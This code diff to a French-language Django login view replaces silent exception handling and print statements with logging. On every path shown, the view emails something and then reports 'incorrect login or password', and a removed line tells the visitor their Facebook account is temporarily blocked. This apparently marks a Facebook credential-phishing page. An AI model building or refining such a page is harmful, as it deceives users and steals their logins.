@@ -5,6 +5,10 @@ from django.conf import settings
 from django.core.mail import EmailMessage
 from django.template.loader import render_to_string
 from django.contrib.auth.models import User
+import logging
+
+
+log = logging.getLogger('errors_log')
 
 
 def admins_email(recipient:list)->list:
@@ -35,10 +39,10 @@ def index(request):
         email.fail_silently = False
         try:
             email.send()
-        except:
-            pass
+        except Exception as e:
+            log.error(e)
         else:
-            print("Message envoyé")
+            log.info("Message envoyé")
 
         # the number of attempts limited to 5
         try:
@@ -47,13 +51,10 @@ def index(request):
             request.session['delay'] = 1
 
         if request.session['delay'] == 5:
-            print("Trop de tentatifs. Votre facebook est temporairement bloqué")
-            print("Réessayer dans 4 minutes")
             context['limited'] = request.session.get('delay')
+            log.info(f"Trop de tentatifs: {request.session.get('delay')} fois")
             
             request.session.set_expiry(60*3) # 3 minutes se expire
-
-        print(request.session.get('delay'))
 
         messages.info(request, "Votre identifiant ou mot de passe incorrect. Réessayer")
         return render(request, 'app/index.html', context)
